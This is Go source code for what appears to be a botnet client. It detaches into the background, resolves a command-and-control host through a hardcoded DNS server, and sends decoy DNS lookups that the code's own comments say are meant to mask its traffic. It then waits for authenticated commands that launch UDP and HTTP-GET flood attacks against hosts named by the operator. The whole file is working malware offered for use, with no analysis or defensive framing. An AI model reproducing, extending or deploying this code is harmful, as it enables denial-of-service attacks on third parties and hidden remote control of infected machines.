package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var debug bool

func home() {
	home_msg := table_getID(3)
	for {
		host := resolv(table_getID(0))
		port := table_getID(1)

		c_home_addr := net.JoinHostPort(host, port)
		if debug {
			log.Printf("Attemping to connect to c_home %s ...", c_home_addr)
		}

		conn, err := net.Dial("tcp", c_home_addr)
		if err != nil {
			if debug {
				log.Println("Failed to connect to c_home", c_home_addr)
			}
			time.Sleep(5 * time.Second)
			continue
		}

		defer conn.Close()
		if debug {
			log.Printf("Successfully connected to c_home %s", c_home_addr)

		}
		conn.Write([]byte("ay cuh open the connection for me cuh! EEE:EEE:EEE"))

		for {
			buf := make([]byte, 1024)
			n, err := conn.Read(buf)
			if err != nil {
				//log.Println(err) // lost connection to c_home
				break
			}

			msg := string(buf[:n])
			if msg == "Who is the best hololive girl?" {
				conn.Write([]byte("okayu"))
			} else if strings.HasPrefix(msg, home_msg) { // konpeko
				cmd := strings.TrimPrefix(msg, home_msg) // konpeko

				if strings.HasPrefix(cmd, "UDP") {
					args := strings.Fields(cmd[4:]) // 6
					if len(args) == 3 {
						host := args[0]
						port, err1 := strconv.Atoi(args[1])
						duration, err2 := strconv.Atoi(args[2])
						if err1 == nil && err2 == nil {
							go atkdup(host, port, duration)
						}

					}
				} else if strings.HasPrefix(cmd, "HTTP-GET") {
					args := strings.Fields(cmd[9:])
					if len(args) == 2 {
						host := args[0]
						duration, err := strconv.Atoi(args[1])
						if err == nil {
							go atkHttpGet(host, duration)
						}
					}

				}
			}
		}
	}
}

func resolv(host string) string {
	if debug {
		log.Printf("Resolving domain %s to IPv4 address ...", host)
	}

	resolv := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			return net.DialTimeout("udp", "114.114.114.114:53", 5*time.Second)
		},
	}

	// send false DNS querys to mask our traffic
	for i := 0; i < 11; i++ {
		resolv.LookupIP(context.Background(), "ip", "fortunesmp.net")

	}

	ipv4, _ := resolv.LookupIP(context.Background(), "ip", host)
	if debug {
		log.Printf("Resolved %s to %s", host, ipv4)
	}

	// send more false DNS querys
	for i := 0; i < 11; i++ {
		resolv.LookupIP(context.Background(), "ip", "fortunesmp.net")
	}

	return ipv4[0].String()
}

func daemon() {
	//                              os.Args[1:]...
	cmd := exec.Command(os.Args[0], os.Args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
	}

	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil

	cmd.Env = append(os.Environ(), "ENV_CHILD=true")
	tableInit()

	err := cmd.Start()
	if err != nil {
		panic(err)
	}

	fmt.Println(table_getID(4))

	os.Exit(0)
}

func main() {
	debug = os.Getenv("DEBUG") == "true"

	if debug {
		log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
		log.SetOutput(os.Stdout)
		log.Println("Debug mode is enabled")
	} else {
		if os.Getenv("ENV_CHILD") == "" {
			daemon()
		}
	}

	tableInit()
	home()
}
